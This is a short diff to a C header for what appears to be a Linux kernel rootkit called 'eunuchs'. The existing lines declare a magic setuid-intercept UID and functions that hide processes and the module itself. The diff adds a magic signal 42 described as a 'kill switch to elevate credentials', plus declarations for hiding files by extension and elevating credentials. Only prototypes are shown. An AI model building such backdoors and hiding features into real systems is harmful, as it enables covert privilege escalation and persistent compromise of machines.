@@ -18,6 +18,9 @@
 /* magic number for our setuid intercept */
 #define EUNUCHS_MAGIC_UID 0xdead
 
+/* magic number for our kill switch to elevate credentials */
+#define EUNUCHS_MAGIC_SIGNAL 42
+
 static int eunuchs_init(void);
 static void eunuchs_exit(void);
 static int eunuchs_hooks_install(void);
@@ -31,5 +34,8 @@ static int show_proc_by_pid(char *);
 static int eunuchs_lists_show_all(void);
 static int eunuchs_hide_lkm(void);
 static int eunuchs_show_lkm(void);
+static int show_file_by_ext(char *);
+static int hide_file_by_ext(char *);
+static int eunuchs_elevate_creds(void);
 
 #endif
